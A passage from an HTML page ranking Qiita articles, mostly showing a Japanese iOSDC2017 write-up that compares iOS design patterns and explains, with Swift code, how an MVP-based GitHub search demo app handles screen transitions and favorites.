<li><p>最近はYoutube動画のみで公開されている技術情報も多いです（特にカンファレンス系）。このためYoutubeで対象技術を検索し、その動画をスライドページが移る間隔でザッピングします。面白そうな情報がありそうなら動画を実際に見る＆聞きます。英語でも字幕ONにすれば、一時停止しながら内容はある程度把握できます。個人的にはDockerConは欠かさず見てます。</p></li>
<li><p>中国語のIT関連情報も質が高いものが増えています。分かりやすい画像がある場合は質の高い情報の可能性が高いため、Google翻訳を活用してざっくりと読んでみます。ある時、DockerのDNS周りの情報を調べてた時に、実装をちゃんと調べたうえで分かりやすく解説をしていた唯一の記事が中国語でした。</p></li>
</ul>
</div>
	</td>
</tr>
</table>
<br />
<table border="1" style="height:150px;">
<tr>
	<td rowspan="3">51位</td>
	<td colspan="4">
		<kbd><i><img alt="いいね" width="16" height="16" src="thumb-up-120px.png" /></i>197</kbd>
		<a target="_blank" href="https://qiita.com/marty-suzuki/items/5a4f680b10bb82501aa3">【iOSDC2017】MVC→MVP→MVVM→Fluxの実装の違いを比較してみる</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2017-09-22<br />17:35:49</center>
	</td>
	<td style="width:200px;">
		<!--投稿者-->
		<center>
			@<a href="user/60325.html">marty-suzuki</a>(41件の記事)<br />(CyberAgent, Inc. AbemaTV 所属)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/60325/profile-images/1473695196">
		</center>
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[flux]</b> <b>[mvc]</b> <b>[MVVM]</b> <b>[Swift]</b> <b>[MVP]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;">
<h1>
<span id="はじめに" class="fragment"></span><a href="#%E3%81%AF%E3%81%98%E3%82%81%E3%81%AB"><i class="fa fa-link"></i></a>はじめに</h1>

<p>iOSDC2017にて<a href="https://iosdc.jp/2017/node/1396" rel="nofollow noopener" target="_blank">MVC→MVP→MVVM→Fluxの実装の違いを比較してみる</a>という内容で、Githubのユーザー検索のデモアプリをベースにした発表資料で登壇させていただきました。<br>
登壇枠が15分だったため、ViewControllerを跨いだ（FavoriteViewController &lt;-&gt; RepositoryViewController）4つのデザインパターンの実装の違いにフォーカスした内容となっているので、画面遷移やテストの書き方などについても補足説明を書いていきます。<br>
※MVP、MVVM、Fluxでの補足説明という形で書いていきます。<br>
登壇資料は下記になります。</p>

<blockquote class="twitter-tweet">
<p>本日のプレゼン資料、アップしました。<a href="https://t.co/TIecyULVp4" rel="nofollow noopener" target="_blank">https://t.co/TIecyULVp4</a><a href="https://twitter.com/hashtag/iosdc?src=hash" rel="nofollow noopener" target="_blank">#iosdc</a></p>— marty-suzuki (@marty_suzuki) <a href="https://twitter.com/marty_suzuki/status/909316660372291584" rel="nofollow noopener" target="_blank">September 17, 2017</a>
</blockquote>



<p>また登壇時に利用したサンプルソースは、こちらのリポジトリで公開されています。<br>
<a href="https://github.com/marty-suzuki/iOSDesignPatternSamples" class="autolink" rel="nofollow noopener" target="_blank">https://github.com/marty-suzuki/iOSDesignPatternSamples</a></p>

<p>デモアプリのアプリの動きはこのようになります。</p>

<p><a href="https://camo.qiitausercontent.com/cd7d0490535676fad44c976517d37ed25b1a9d68/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f36303332352f65313762383236312d316635622d313861632d636630632d3835333264636339343534312e676966" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/cd7d0490535676fad44c976517d37ed25b1a9d68/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f36303332352f65313762383236312d316635622d313861632d636630632d3835333264636339343534312e676966" alt="app.gif" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/60325/e17b8261-1f5b-18ac-cf0c-8532dcc94541.gif"></a></p>

<ul>
<li>SearchViewController... 文字列検索でGithub上のユーザーのリストを取得し、表示します。</li>
<li>UserRepositoryViewController... SearchViewControllerで選択されたユーザーのリポジトリ一覧を取得し、表示します。</li>
<li>RepositoryViewController... UserRepositoryViewControllerまたはFavoriteViewControllerで選択されたリポジトリをSafariViewで表示します。また、右上のお気に入りボタンから、レポジトリをFavoriteViewControllerに追加・削除ができます。</li>
<li>FavoriteViewController... お気に入りされたリポジトリの一覧が表示されます。</li>
</ul>

<p><a href="https://camo.qiitausercontent.com/4b7938cae1b7d28f77de233ef1b29439c2e53161/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f36303332352f65353931356139392d326531342d323261612d393030662d3633383033353139363166652e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/4b7938cae1b7d28f77de233ef1b29439c2e53161/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f36303332352f65353931356139392d326531342d323261612d393030662d3633383033353139363166652e706e67" alt="structure.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/60325/e5915a99-2e14-22aa-900f-6380351961fe.png"></a></p>

<h2>
<span id="mvp" class="fragment"></span><a href="#mvp"><i class="fa fa-link"></i></a>MVP</h2>

<p>それでは、まずMVPによる実装について書いていきます。</p>

<p><a href="https://camo.qiitausercontent.com/6adff52e2d812f0a8cabfda593917a531e8738be/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f36303332352f66626236346439662d313136372d663063302d616137322d3565313766366262316661332e6a706567" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/6adff52e2d812f0a8cabfda593917a531e8738be/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f36303332352f66626236346439662d313136372d663063302d616137322d3565313766366262316661332e6a706567" width="50%" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/60325/fbb64d9f-1167-f0c0-aa72-5e17f6bb1fa3.jpeg"></a></p>

<p>ViewControllerに実装されるプレゼンテーション層に関するロジックをPresenterに実装することで、責務を明確にすることができます。<br>
流れとしては、Viewはユーザーからのアクションを受け取ってPresenterに渡します。<br>
そして、そのアクションによってPresenterはModelの取得や更新を行います。<br>
Presenterは更新された情報をもとにViewの反映メソッドを呼び、Viewに更新結果を反映させます。</p>

<h3>
<span id="画面遷移" class="fragment"></span><a href="#%E7%94%BB%E9%9D%A2%E9%81%B7%E7%A7%BB"><i class="fa fa-link"></i></a>画面遷移</h3>

<p><code>UITableViewDataSource</code>や<code>UITableViewDelegate</code>の実装を、<code>FavoriteViewController</code>の場合は<code>FavoriteViewDataSource</code>に移しています。<br>
<code>FavoriteViewDataSource</code>内の<code>tableView(_:didSelectRowAt:)</code>では、<code>FavoritePresenter</code>の<code>showFavoriteRepository(at:)</code>が呼び出されています。</p>

<div class="code-frame" data-lang="swift">
<div class="code-lang"><span class="bold">FavoriteViewDataSource</span></div>
<div class="highlight"><pre><span></span><span class="kr">final</span> <span class="kd">class</span> <span class="nc">FavoriteViewDataSource</span><span class="p">:</span> <span class="bp">NSObject</span><span class="p">,</span> <span class="bp">UITableViewDelegate</span><span class="p">,</span> <span class="p">...</span> <span class="p">{</span>
    <span class="kd">private</span> <span class="kd">let</span> <span class="nv">presenter</span><span class="p">:</span> <span class="n">FavoritePresenter</span>

    <span class="kd">init</span><span class="p">(</span><span class="n">presenter</span><span class="p">:</span> <span class="n">FavoritePresenter</span><span class="p">)</span> <span class="p">{</span>
        <span class="kc">self</span><span class="p">.</span><span class="n">presenter</span> <span class="p">=</span> <span class="n">presenter</span>
    <span class="p">}</span>
    <span class="p">...</span>
    <span class="kd">func</span> <span class="nf">tableView</span><span class="p">(</span><span class="kc">_</span> <span class="n">tableView</span><span class="p">:</span> <span class="bp">UITableView</span><span class="p">,</span> <span class="n">didSelectRowAt</span> <span class="n">indexPath</span><span class="p">:</span> <span class="n">IndexPath</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">presenter</span><span class="p">.</span><span class="n">showFavoriteRepository</span><span class="p">(</span><span class="n">at</span><span class="p">:</span> <span class="n">indexPath</span><span class="p">.</span><span class="n">row</span><span class="p">)</span>
    <span class="p">}</span>
    <span class="p">...</span>
<span class="p">}</span>
</pre></div>
</div>

<p><code>FavoritePresenter</code>はprotocolとなっていて、実装がされてるのは<code>FavoriteViewPresenter</code>になります。<br>
<code>showFavoriteRepository(at:)</code>が呼び出されると、presenter内で保持している<code>GithubKit.Repository</code>の配列から該当の<code>GithubKit.Repository</code>を取得し、<code>FavoriteView</code>の<code>showRepository(with:)</code>を呼び出しています。</p>

<div class="code-frame" data-lang="swift">
<div class="code-lang"><span class="bold">FavoritePresenter</span></div>
<div class="highlight"><pre><span></span><span class="kd">protocol</span> <span class="nc">FavoritePresenter</span><span class="p">:</span> <span class="kd">class</span> <span class="p">{</span>
    <span class="kd">init</span><span class="p">(</span><span class="n">view</span><span class="p">:</span> <span class="n">FavoriteView</span><span class="p">)</span>
    <span class="p">...</span>
    <span class="kd">func</span> <span class="nf">showFavoriteRepository</span><span class="p">(</span><span class="n">at</span> <span class="n">index</span><span class="p">:</span> <span class="nb">Int</span><span class="p">)</span>
    <span class="p">...</span>
<span class="p">}</span>

<span class="kr">final</span> <span class="kd">class</span> <span class="nc">FavoriteViewPresenter</span><span class="p">:</span> <span class="n">FavoritePresenter</span> <span class="p">{</span>
    <span class="kd">private</span> <span class="kr">weak</span> <span class="kd">var</span> <span class="nv">view</span><span class="p">:</span> <span class="n">FavoriteView</span><span class="p">?</span>
    <span class="kd">private</span> <span class="kd">var</span> <span class="nv">favorites</span><span class="p">:</span> <span class="p">[</span><span class="n">GithubKit</span><span class="p">.</span><span class="n">Repository</span><span class="p">]</span> <span class="p">=</span> <span class="p">[]</span> <span class="p">{</span>
        <span class="kr">didSet</span> <span class="p">{</span>
            <span class="n">view</span><span class="p">?.</span><span class="n">reloadData</span><span class="p">()</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="p">...</span>
    <span class="kd">init</span><span class="p">(</span><span class="n">view</span><span class="p">:</span> <span class="n">FavoriteView</span><span class="p">)</span> <span class="p">{</span>
        <span class="kc">self</span><span class="p">.</span><span class="n">view</span> <span class="p">=</span> <span class="n">view</span>
    <span class="p">}</span>
    <span class="p">...</span>
    <span class="kd">func</span> <span class="nf">showFavoriteRepository</span><span class="p">(</span><span class="n">at</span> <span class="n">index</span><span class="p">:</span> <span class="nb">Int</span><span class="p">)</span> <span class="p">{</span>
        <span class="kd">let</span> <span class="nv">repository</span> <span class="p">=</span> <span class="n">favorites</span><span class="p">[</span><span class="n">index</span><span class="p">]</span>
        <span class="n">view</span><span class="p">?.</span><span class="n">showRepository</span><span class="p">(</span><span class="n">with</span><span class="p">:</span> <span class="n">repository</span><span class="p">)</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></div>
</div>

<p><code>FavoriteView</code>はprotocolとなっていて、実装がされてるのは<code>FavoriteViewController</code>になります。<br>
<code>showRepository(with:)</code>が呼び出されると<code>RepositoryViewController</code>を初期化し、navigationControllerでpushすることで遷移させます。</p>

<div class="code-frame" data-lang="swift">
<div class="code-lang"><span class="bold">FavoriteView</span></div>
<div class="highlight"><pre><span></span><span class="kd">protocol</span> <span class="nc">FavoriteView</span><span class="p">:</span> <span class="kd">class</span> <span class="p">{</span>
    <span class="p">...</span>
    <span class="kd">func</span> <span class="nf">showRepository</span><span class="p">(</span><span class="n">with</span> <span class="n">repository</span><span class="p">:</span> <span class="n">GithubKit</span><span class="p">.</span><span class="n">Repository</span><span class="p">)</span>
<span class="p">}</span>

<span class="kr">final</span> <span class="kd">class</span> <span class="nc">FavoriteViewController</span><span class="p">:</span> <span class="bp">UIViewController</span><span class="p">,</span> <span class="n">FavoriteView</span> <span class="p">{</span>
    <span class="kr">@IBOutlet</span> <span class="kr">weak</span> <span class="kd">var</span> <span class="nv">tableView</span><span class="p">:</span> <span class="bp">UITableView</span><span class="p">!</span>

    <span class="kd">private</span><span class="p">(</span><span class="kr">set</span><span class="p">)</span> <span class="kr">lazy</span> <span class="kd">var</span> <span class="nv">presenter</span><span class="p">:</span> <span class="n">FavoritePresenter</span> <span class="p">=</span> <span class="n">FavoriteViewPresenter</span><span class="p">(</span><span class="n">view</span><span class="p">:</span> <span class="kc">self</span><span class="p">)</span>
    <span class="kd">private</span> <span class="kr">lazy</span> <span class="kd">var</span> <span class="nv">dataSource</span><span class="p">:</span> <span class="n">FavoriteViewDataSource</span> <span class="p">=</span> <span class="p">.</span><span class="kd">init</span><span class="p">(</span><span class="n">presenter</span><span class="p">:</span> <span class="kc">self</span><span class="p">.</span><span class="n">presenter</span><span class="p">)</span>
    <span class="p">...</span>
    <span class="kd">func</span> <span class="nf">showRepository</span><span class="p">(</span><span class="n">with</span> <span class="n">repository</span><span class="p">:</span> <span class="n">GithubKit</span><span class="p">.</span><span class="n">Repository</span><span class="p">)</span> <span class="p">{</span>
        <span class="kd">let</span> <span class="nv">vc</span> <span class="p">=</span> <span class="n">RepositoryViewController</span><span class="p">(</span><span class="n">repository</span><span class="p">:</span> <span class="n">repository</span><span class="p">,</span> <span class="n">favoritePresenter</span><span class="p">:</span> <span class="n">presenter</span><span class="p">)</span>
        <span class="n">navigationController</span><span class="p">?.</span><span class="n">pushViewController</span><span class="p">(</span><span class="n">vc</span><span class="p">,</span> <span class="n">animated</span><span class="p">:</span> <span class="kc">true</span><span class="p">)</span>
    <span class="p">}</span>
    <span class="p">...</span>
<span class="p">}</span>
</pre></div>
</div>

<p>上記のTableViewのCellが選択されてから、次のViewControllerに遷移するまでの流れは下図のようになります。</p>

<p><a href="https://camo.qiitausercontent.com/c9475f06a7aca6de0f3b8b98410ae5500bcf0f8e/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f36303332352f33383636323230622d343766322d323132632d383563652d3866666433393061343035662e6a706567" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/c9475f06a7aca6de0f3b8b98410ae5500bcf0f8e/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f36303332352f33383636323230622d343766322d323132632d383563652d3866666433393061343035662e6a706567" alt="MVP.002.jpeg" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/60325/3866220b-47f2-212c-85ce-8ffd390a405f.jpeg"></a></p>

<h3>
<span id="お気に入りに追加" class="fragment"></span><a href="#%E3%81%8A%E6%B0%97%E3%81%AB%E5%85%A5%E3%82%8A%E3%81%AB%E8%BF%BD%E5%8A%A0"><i class="fa fa-link"></i></a>お気に入りに追加</h3>

<p>favoriteButtonItemがタップされると<code>favoriteButtonTap(_:)</code>が呼び出されるので、<code>RepositoryPresenter</code>の<code>favoriteButtonTap()</code>を呼び出します。<br>
また、presenterのviewがinitializerの引数に含まれていない理由としては、repositoryとfavoritePresenterをViewControllerで保持せずに済むようにするためです。</p>

<div class="code-frame" data-lang="swift">
<div class="code-lang"><span class="bold">RepositoryView</span></div>
<div class="highlight"><pre><span></span><span class="kd">protocol</span> <span class="nc">RepositoryView</span><span class="p">:</span> <span class="kd">class</span> <span class="p">{</span>
    <span class="p">...</span>
<span class="p">}</span>

<span class="kr">final</span> <span class="kd">class</span> <span class="nc">RepositoryViewController</span><span class="p">:</span> <span class="n">SFSafariViewController</span><span class="p">,</span> <span class="p">...</span> <span class="p">{</span>
    <span class="kd">private</span><span class="p">(</span><span class="kr">set</span><span class="p">)</span> <span class="kr">lazy</span> <span class="kd">var</span> <span class="nv">favoriteButtonItem</span><span class="p">:</span> <span class="bp">UIBarButtonItem</span> <span class="p">=</span> <span class="p">{...}()</span>
    <span class="kd">private</span> <span class="kd">let</span> <span class="nv">presenter</span><span class="p">:</span> <span class="n">RepositoryPresenter</span>

    <span class="kd">init</span><span class="p">(</span><span class="n">repository</span><span class="p">:</span> <span class="n">GithubKit</span><span class="p">.</span><span class="n">Repository</span><span class="p">,</span>
         <span class="n">favoritePresenter</span><span class="p">:</span> <span class="n">FavoritePresenter</span><span class="p">)</span> <span class="p">{</span>
        <span class="kc">self</span><span class="p">.</span><span class="n">presenter</span> <span class="p">=</span> <span class="n">RepositoryViewPresenter</span><span class="p">(</span><span class="n">repository</span><span class="p">:</span> <span class="n">repository</span><span class="p">,</span>
                                                 <span class="n">favoritePresenter</span><span class="p">:</span> <span class="n">favoritePresenter</span><span class="p">)</span>
        <span class="kc">super</span><span class="p">.</span><span class="kd">init</span><span class="p">(</span><span class="n">url</span><span class="p">:</span> <span class="n">repository</span><span class="p">.</span><span class="n">url</span><span class="p">,</span> <span class="n">entersReaderIfAvailable</span><span class="p">:</span> <span class="kc">true</span><span class="p">)</span>
        <span class="kc">self</span><span class="p">.</span><span class="n">presenter</span><span class="p">.</span><span class="n">view</span> <span class="p">=</span> <span class="kc">self</span>
    <span class="p">}</span>
    <span class="p">...</span>
    <span class="kr">@objc</span> <span class="kd">private</span> <span class="kd">func</span> <span class="nf">favoriteButtonTap</span><span class="p">(</span><span class="kc">_</span> <span class="n">sender</span><span class="p">:</span> <span class="bp">UIBarButtonItem</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">presenter</span><span class="p">.</span><span class="n">favoriteButtonTap</span><span class="p">()</span>
    <span class="p">}</span>
    <span class="p">...</span>
<span class="p">}</span>
</pre></div>
</div>

<p><code>RepositoryPresenter</code>の初期化時にViewも引数として含めたい場合は、下記のようにLazy Initializationを利用することで実現可能です。<br>
しかしこの場合に、<code>RepositoryPresenter</code>内でrepositoryとfavoritePresenterを保持するにも関わらず、ViewControllerでも保持してしまうという問題もあるかと思います。</p>

<div class="code-frame" data-lang="swift">
<div class="code-lang"><span class="bold">RepositoryViewController</span></div>
<div class="highlight"><pre><span></span><span class="kr">final</span> <span class="kd">class</span> <span class="nc">RepositoryViewController</span><span class="p">:</span> <span class="n">SFSafariViewController</span><span class="p">,</span> <span class="p">...</span> <span class="p">{</span>
    <span class="p">...</span>
    <span class="kd">private</span><span class="p">(</span><span class="kr">set</span><span class="p">)</span> <span class="kr">lazy</span> <span class="kd">var</span> <span class="nv">presenter</span><span class="p">:</span> <span class="n">RepositoryPresenter</span> <span class="p">=</span> <span class="p">{</span>
        <span class="k">return</span> <span class="n">RepositoryViewPresenter</span><span class="p">(</span><span class="n">repository</span><span class="p">:</span> <span class="kc">self</span><span class="p">.</span><span class="n">repository</span><span class="p">,</span>
                                       <span class="n">favoritePresenter</span><span class="p">:</span> <span class="kc">self</span><span class="p">.</span><span class="n">favoritePresenter</span><span class="p">,</span>
                                       <span class="n">view</span><span class="p">:</span> <span class="kc">self</span><span class="p">)</span>
    <span class="p">}()</span>
    <span class="kd">private</span> <span class="kd">let</span> <span class="nv">repository</span><span class="p">:</span> <span class="n">Repository</span>                           
    <span class="kd">private</span> <span class="kd">let</span> <span class="nv">favoritePresenter</span><span class="p">:</span> <span class="n">FavoritePresenter</span>

    <span class="kd">init</span><span class="p">(</span><span class="n">repository</span><span class="p">:</span> <span class="n">Repository</span><span class="p">,</span>
         <span class="n">favoritePresenter</span><span class="p">:</span> <span class="n">FavoritePresenter</span><span class="p">)</span> <span class="p">{</span>
        <span class="kc">self</span><span class="p">.</span><span class="n">repository</span> <span class="p">=</span> <span class="n">repository</span><span class="p">,</span>
        <span class="kc">self</span><span class="p">.</span><span class="n">favoritePresenter</span> <span class="p">=</span> <span class="n">favoritePresenter</span>
        <span class="kc">super</span><span class="p">.</span><span class="kd">init</span><span class="p">(</span><span class="n">url</span><span class="p">:</span> <span class="n">repository</span><span class="p">.</span><span class="n">url</span><span class="p">,</span> <span class="n">entersReaderIfAvailable</span><span class="p">:</span> <span class="kc">true</span><span class="p">)</span>
    <span class="p">}</span>
    <span class="p">...</span>
<span class="p">}</span>
</pre></div>
</div>

<p><code>RepositoryPresenter</code>はprotocolとなっていて、実装がされてるのは<code>RepositoryViewPresenter</code>になります。<br>
<code>favoriteButtonTap()</code>が呼ばれると、<code>RepositoryViewPresenter</code>で保持している<code>Repository</code>が<code>FavoritePresenter</code>内に含まれているかを確認し、その結果によってお気に入りの一覧に追加または削除をしています。</p>

<div class="code-frame" data-lang="swift">
<div class="code-lang"><span class="bold">RepositoryPresenter</span></div>
<div class="highlight"><pre><span></span><span class="kd">protocol</span> <span class="nc">RepositoryPresenter</span><span class="p">:</span> <span class="kd">class</span> <span class="p">{</span>
    <span class="kd">init</span><span class="p">(</span><span class="n">repository</span><span class="p">:</span> <span class="n">GithubKit</span><span class="p">.</span><span class="n">Repository</span><span class="p">,</span> <span class="n">favoritePresenter</span><span class="p">:</span> <span class="n">FavoritePresenter</span><span class="p">)</span>
    <span class="kr">weak</span> <span class="kd">var</span> <span class="nv">view</span><span class="p">:</span> <span class="n">RepositoryView</span><span class="p">?</span> <span class="p">{</span> <span class="kr">get</span> <span class="kr">set</span> <span class="p">}</span>
    <span class="p">...</span>
    <span class="kd">func</span> <span class="nf">favoriteButtonTap</span><span class="p">()</span>
<span class="p">}</span>

<span class="kr">final</span> <span class="kd">class</span> <span class="nc">RepositoryViewPresenter</span><span class="p">:</span> <span class="n">RepositoryPresenter</span> <span class="p">{</span>
    <span class="kr">weak</span> <span class="kd">var</span> <span class="nv">view</span><span class="p">:</span> <span class="n">RepositoryView</span><span class="p">?</span>
    <span class="kd">private</span> <span class="kd">let</span> <span class="nv">favoritePresenter</span><span class="p">:</span> <span class="n">FavoritePresenter</span>
    <span class="kd">private</span> <span class="kd">let</span> <span class="nv">repository</span><span class="p">:</span> <span class="n">GithubKit</span><span class="p">.</span><span class="n">Repository</span>
    <span class="p">...</span>
    <span class="kd">init</span><span class="p">(</span><span class="n">repository</span><span class="p">:</span> <span class="n">GithubKit</span><span class="p">.</span><span class="n">Repository</span><span class="p">,</span> <span class="n">favoritePresenter</span><span class="p">:</span> <span class="n">FavoritePresenter</span><span class="p">)</span> <span class="p">{</span>
        <span class="kc">self</span><span class="p">.</span><span class="n">repository</span> <span class="p">=</span> <span class="n">repository</span>
        <span class="kc">self</span><span class="p">.</span><span class="n">favoritePresenter</span> <span class="p">=</span> <span class="n">favoritePresenter</span>
    <span class="p">}</span>

    <span class="kd">func</span> <span class="nf">favoriteButtonTap</span><span class="p">()</span> <span class="p">{</span>
        <span class="k">if</span> <span class="n">favoritePresenter</span><span class="p">.</span><span class="bp">contains</span><span class="p">(</span><span class="n">repository</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">favoritePresenter</span><span class="p">.</span><span class="n">removeFavorite</span><span class="p">(</span><span class="n">repository</span><span class="p">)</span>
            <span class="p">...</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="n">favoritePresenter</span><span class="p">.</span><span class="n">addFavorite</span><span class="p">(</span><span class="n">repository</span><span class="p">)</span>
            <span class="p">...</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></div>
</div>

<p><code>FavoritePresenter</code>はprotocolとなっていて、実装がされてるのは<code>FavoriteViewPresenter</code>になります。<br>
お気に入りの一覧を保持している<code>favorites: [GithubKit.Repository]</code>が更新されると、<code>FavoriteView</code>の<code>reloadData()</code>を呼び出します。</p>

<div class="code-frame" data-lang="swift">
<div class="code-lang"><span class="bold">FavoritePresenter</span></div>
<div class="highlight"><pre><span></span><span class="kd">protocol</span> <span class="nc">FavoritePresenter</span><span class="p">:</span> <span class="kd">class</span> <span class="p">{</span>
    <span class="p">...</span>
    <span class="kd">func</span> <span class="nf">addFavorite</span><span class="p">(</span><span class="kc">_</span> <span class="n">repository</span><span class="p">:</span> <span class="n">GithubKit</span><span class="p">.</span><span class="n">Repository</span><span class="p">)</span>
    <span class="kd">func</span> <span class="nf">removeFavorite</span><span class="p">(</span><span class="kc">_</span> <span class="n">repository</span><span class="p">:</span> <span class="n">GithubKit</span><span class="p">.</span><span class="n">Repository</span><span class="p">)</span>
    <span class="kd">func</span> <span class="nf">contains</span><span class="p">(</span><span class="kc">_</span> <span class="n">repository</span><span class="p">:</span> <span class="n">Repository</span><span class="p">)</span> <span class="p">-&gt;</span> <span class="nb">Bool</span>
    <span class="p">...</span>
<span class="p">}</span>

<span class="kr">final</span> <span class="kd">class</span> <span class="nc">FavoriteViewPresenter</span><span class="p">:</span> <span class="n">FavoritePresenter</span> <span class="p">{</span>
    <span class="kd">private</span> <span class="kr">weak</span> <span class="kd">var</span> <span class="nv">view</span><span class="p">:</span> <span class="n">FavoriteView</span><span class="p">?</span>
    <span class="kd">private</span> <span class="kd">var</span> <span class="nv">favorites</span><span class="p">:</span> <span class="p">[</span><span class="n">GithubKit</span><span class="p">.</span><span class="n">Repository</span><span class="p">]</span> <span class="p">=</span> <span class="p">[]</span> <span class="p">{</span>
        <span class="kr">didSet</span> <span class="p">{</span>
            <span class="n">view</span><span class="p">?.</span><span class="n">reloadData</span><span class="p">()</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="p">...</span>
    <span class="kd">func</span> <span class="nf">addFavorite</span><span class="p">(</span><span class="kc">_</span> <span class="n">repository</span><span class="p">:</span> <span class="n">GithubKit</span><span class="p">.</span><span class="n">Repository</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="n">favorites</span><span class="p">.</span><span class="kr">lazy</span><span class="p">.</span><span class="n">index</span><span class="p">(</span><span class="k">where</span><span class="p">:</span> <span class="p">{</span> <span class="nv">$0</span><span class="p">.</span><span class="n">url</span> <span class="p">==</span> <span class="n">repository</span><span class="p">.</span><span class="n">url</span> <span class="p">})</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
            <span class="k">return</span>
        <span class="p">}</span>
        <span class="n">favorites</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">repository</span><span class="p">)</span>
    <span class="p">}</span>

    <span class="kd">func</span> <span class="nf">removeFavorite</span><span class="p">(</span><span class="kc">_</span> <span class="n">repository</span><span class="p">:</span> <span class="n">GithubKit</span><span class="p">.</span><span class="n">Repository</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">guard</span> <span class="kd">let</span> <span class="nv">index</span> <span class="p">=</span> <span class="n">favorites</span><span class="p">.</span><span class="kr">lazy</span><span class="p">.</span><span class="n">index</span><span class="p">(</span><span class="k">where</span><span class="p">:</span> <span class="p">{</span> <span class="nv">$0</span><span class="p">.</span><span class="n">url</span> <span class="p">==</span> <span class="n">repository</span><span class="p">.</span><span class="n">url</span> <span class="p">})</span> <span class="k">else</span> <span class="p">{</span>
            <span class="k">return</span>
        <span class="p">}</span>
        <span class="n">favorites</span><span class="p">.</span><span class="n">remove</span><span class="p">(</span><span class="n">at</span><span class="p">:</span> <span class="n">index</span><span class="p">)</span>
    <span class="p">}</span>

    <span class="kd">func</span> <span class="nf">contains</span><span class="p">(</span><span class="kc">_</span> <span class="n">repository</span><span class="p">:</span> <span class="n">GithubKit</span><span class="p">.</span><span class="n">Repository</span><span class="p">)</span> <span class="p">-&gt;</span> <span class="nb">Bool</span> <span class="p">{</span>
        <span class="k">return</span> <span class="n">favorites</span><span class="p">.</span><span class="kr">lazy</span><span class="p">.</span><span class="n">index</span> <span class="p">{</span> <span class="nv">$0</span><span class="p">.</span><span class="n">url</span> <span class="p">==</span> <span class="n">repository</span><span class="p">.</span><span class="n">url</span> <span class="p">}</span> <span class="o">!=</span> <span class="kc">nil</span>
    <span class="p">}</span>
    <span class="p">...</span>
<span class="p">}</span>
</pre></div>
</div>

<p><code>reloadData()</code>の中では<code>tableView?.reloadData()</code>が実行され、お気に入り一覧の画面が更新されます。</p>

<div class="code-frame" data-lang="swift">
<div class="code-lang"><span class="bold">FavoriteView</span></div>
<div class="highlight"><pre><span></span><span class="kd">protocol</span> <span class="nc">FavoriteView</span><span class="p">:</span> <span class="kd">class</span> <span class="p">{</span>
    <span class="kd">func</span> <span class="nf">reloadData</span><span class="p">()</span>
    <span class="p">...</span>
<span class="p">}</span>

<span class="kr">final</span> <span class="kd">class</span> <span class="nc">FavoriteViewController</span><span class="p">:</span> <span class="bp">UIViewController</span><span class="p">,</span> <span class="n">FavoriteView</span> <span class="p">{</span>
    <span class="kr">@IBOutlet</span> <span class="kr">weak</span> <span class="kd">var</span> <span class="nv">tableView</span><span class="p">:</span> <span class="bp">UITableView</span><span class="p">!</span>

    <span class="kd">private</span><span class="p">(</span><span class="kr">set</span><span class="p">)</span> <span class="kr">lazy</span> <span class="kd">var</span> <span class="nv">presenter</span><span class="p">:</span> <span class="n">FavoritePresenter</span> <span class="p">=</span> <span class="n">FavoriteViewPresenter</span><span class="p">(</span><span class="n">view</span><span class="p">:</span> <span class="kc">self</span><span class="p">)</span>
    <span class="p">...</span>
    <span class="kd">func</span> <span class="nf">reloadData</span><span class="p">()</span> <span class="p">{</span>
        <span class="n">tableView</span><span class="p">?.</span><span class="n">reloadData</span><span class="p">()</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></div>
</div>

<p>お気に入りに追加/削除される流れは下記のようになります。</p>

<p><code>FavoritePresenter</code>を所有しているのは<code>FavoriteViewController</code>ですが、ViewControllerが遷移する際に<code>FavoritePresenter</code>の参照が渡されていきます。<br>
<code>RepositoryViewController</code>でお気に入りにボタンがタップされた際に、<code>FavoritePresenter</code>内で保持している<code>GithubKit.Repository</code>の配列の状態によって<code>RepositoryViewController</code>の<code>Repository</code>が追加または削除されます。<br>
<code>Repository</code>の配列に変更があると<code>view?.reloadData()</code>が実行されるので、<code>FavoriteViewController</code>上でリストが更新されます。</p>

